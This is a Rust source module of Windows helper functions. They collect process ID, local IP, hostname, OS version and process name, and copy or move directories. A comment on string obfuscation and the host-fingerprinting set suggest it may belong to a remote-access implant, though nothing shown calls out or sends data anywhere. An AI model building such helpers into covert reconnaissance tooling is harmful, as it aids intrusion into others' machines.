use fmtools::format; // using obfstr to obfuscate
use local_ip_address::local_ip;
use std::ffi::OsString;
use std::fs;
use std::mem::zeroed;
use std::os::windows::ffi::OsStringExt;
use std::path::Path;
use windows_sys::Wdk::System::SystemServices::RtlGetVersion;
use windows_sys::Win32::System::SystemInformation::OSVERSIONINFOW;
use windows_sys::Win32::System::WindowsProgramming::GetComputerNameW;

// Function to get process ID
pub(crate) fn get_process_id() -> u32 {
    std::process::id()
}

// Function to get local IP address
pub(crate) fn get_local_ip() -> String {
    match local_ip() {
        Ok(ip) => ip.to_string(),
        Err(_) => "unknown".into(),
    }
}

// Function to get hostname
pub(crate) fn get_hostname() -> String {
    let mut buffer: [u16; 256] = [0; 256];
    let mut size: u32 = u32::try_from(buffer.len()).unwrap_or(0);

    unsafe {
        if GetComputerNameW(buffer.as_mut_ptr(), &mut size) != 0 {
            let os_string = OsString::from_wide(&buffer[..(size as usize)]);
            return os_string.into_string().unwrap_or_else(|_| "unknown".into());
        }
    }

    "unknown".into()
}

// Function to get OS version string
pub(crate) fn get_os() -> String {
    let mut version: OSVERSIONINFOW = unsafe { zeroed() };

    unsafe {
        RtlGetVersion(&mut version);
    }

    format!("Windows "{version.dwMajorVersion}"."{version.dwMinorVersion}"."{version.dwBuildNumber})
}

// Function to get process name
pub(crate) fn get_process_name() -> String {
    match std::env::current_exe() {
        Ok(path) => match path.file_name() {
            Some(name) => match name.to_str() {
                Some(str_name) => str_name.to_string(),
                None => "unknown".to_string(),
            },
            None => "unknown".to_string(),
        },
        Err(_) => "unknown".to_string(),
    }
}
// Helper function to copy or move a directory recursively
pub(crate) fn transfer_dir_to(src_dir: &Path, dst_dir: &Path, is_move: bool) -> Result<(), String> {
    if !dst_dir.exists() {
        fs::create_dir_all(dst_dir).map_err(|e| format!("Failed to create directory: "{e}))?;
    }

    let mut entries_to_remove = Vec::new();

    for entry_result in src_dir
        .read_dir()
        .map_err(|e| format!("Failed to read directory: "{e}))?
    {
        let entry = entry_result.map_err(|e| format!("Failed to read directory entry: "{e}))?;
        let file_type = entry
            .file_type()
            .map_err(|e| format!("Failed to read file type: "{e}))?;
        let src_path = entry.path();
        let dst_path = dst_dir.join(entry.file_name());

        if file_type.is_dir() {
            transfer_dir_to(&src_path, &dst_path, is_move)
                .map_err(|e| format!("Failed to transfer directory: "{e}))?;
        } else {
            fs::copy(&src_path, &dst_path).map_err(|e| format!("Failed to copy file: "{e}))?;
            if is_move {
                entries_to_remove.push(src_path);
            }
        }

    }

    if is_move {
        for src_path in entries_to_remove {
            fs::remove_file(&src_path)
                .map_err(|e| format!("Failed to remove source file: "{e}))?;
        }
        fs::remove_dir(src_dir).map_err(|e| format!("Failed to remove source directory: "{e}))?;
    }

    Ok(())
}